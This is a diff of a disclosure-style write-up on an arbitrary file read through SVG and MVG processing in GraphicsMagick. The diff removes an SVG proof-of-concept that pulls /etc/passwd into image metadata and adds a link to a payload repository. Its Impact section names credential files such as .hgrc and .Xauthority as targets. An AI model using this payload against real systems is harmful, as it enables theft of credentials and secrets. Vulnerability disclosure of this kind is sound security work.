@@ -58,12 +58,6 @@ To exploit it malicious user shoud find all coders using it. Here we should take
 - To exploit vulnerability malicious user should convert SVG to GIF, JPEG thumbnails with metadata information.
 
 ### Arbitary file read on image metadata
-```xml
-<?xml version="1.0" standalone="no"?>
-<!--@/etc/passwd-->
-<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
-<svg width="1237px" height="1237px" version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink= " http://www.w3.org/1999/xlink"> <image xlink:href="http://www.google.com/images/branding/googlelogo/2x/googlelogo_color_272x92dp.png" x="0" y="0" height="137px" width="137px"/></svg>
-```
 ![Arbitary file read on image metadata](/images/imagemetadata.gif)
 
 # MVG coder file read
@@ -104,12 +98,18 @@ gm convert exploit.svg output.png
 	x="0" y="0" height="137px" width="137px"/>
 </svg>
 ```
+### Arbitary file read on image metadata
+![Arbitary file read on MVG coder](/images/output_foo_gm.png)
 
 
 # Impact
 
 We are using /etc/passd file for our PoC. The passwd file is not really very sensitive on modern systems. But real malicious user can get access to secrets and credentials stored at configuration files. Passwords are often baked into files such as Mercurial's hgrc file.  X11's .Xauthority file might be useful on an active desktop system.
 
+
+# Exploits
+
+You can find all payloads at Github [repository](https://github.com/d0ge/data-processing)
 
 # Acknowledgement
 
